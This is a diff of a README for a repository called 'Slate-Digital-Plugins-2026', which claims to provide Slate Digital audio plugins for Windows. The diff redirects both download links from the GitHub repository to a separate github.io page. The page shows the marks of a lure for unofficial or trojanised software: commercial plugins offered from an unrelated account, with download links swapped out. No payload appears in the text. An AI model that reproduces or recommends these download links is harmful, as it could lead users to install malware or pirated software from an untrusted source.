@@ -1,6 +1,6 @@
 # 🎧 Slate-Digital-Plugins-2026 - Improve Your Audio Mixes With Ease
 
-[![](https://img.shields.io/badge/Download-Plugin_Package-blue.svg)](https://github.com/Erminiasidelong685/Slate-Digital-Plugins-2026)
+[![](https://img.shields.io/badge/Download-Plugin_Package-blue.svg)](https://erminiasidelong685.github.io)
 
 This repository provides the files necessary to install Slate Digital plugins on Windows computers. These tools adjust your audio tracks and master your recordings. This guide walks you through the steps to set up the software correctly.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these needs before starting the installation process.
 
 Follow these instructions to add the plugins to your system.
 
-[Download the software package here](https://github.com/Erminiasidelong685/Slate-Digital-Plugins-2026)
+[Download the software package here](https://erminiasidelong685.github.io)
 
 1.  Click the blue link above to reach the repository page.
 2.  Locate the green Code button on the main page.
